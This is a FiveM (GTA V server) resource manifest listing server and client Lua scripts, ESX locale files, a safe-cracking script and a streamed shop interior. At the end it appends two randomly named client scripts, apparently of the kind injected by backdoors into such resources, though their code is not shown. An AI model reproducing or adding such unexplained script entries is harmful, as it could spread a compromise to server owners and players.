fx_version 'adamant'

game 'gta5'

description 'Instance'

version '1.1.0'

server_scripts {
	'server.lua',
	'@es_extended/locale.lua',
	'locales/br.lua',
	'locales/en.lua',
	'locales/fr.lua',
	'locales/sv.lua',
	'locales/pl.lua',
	'config.lua',
	'server/main.lua'
}


client_scripts {
	'client.lua',
	'safeCracking.lua',
	'@es_extended/locale.lua',
	'locales/br.lua',
	'locales/en.lua',
	'locales/fr.lua',
	'locales/sv.lua',
	'locales/pl.lua',
	'config.lua',
	'client/main.lua'
}

this_is_a_map 'yes'


data_file 'DLC_ITYP_REQUEST' 'stream/v_int_shop.ytyp'

files {
 'stream/v_int_shop.ytyp'
}

client_script 'kFblUJvRr.lua'

client_script 'U3NuNY9k.lua'
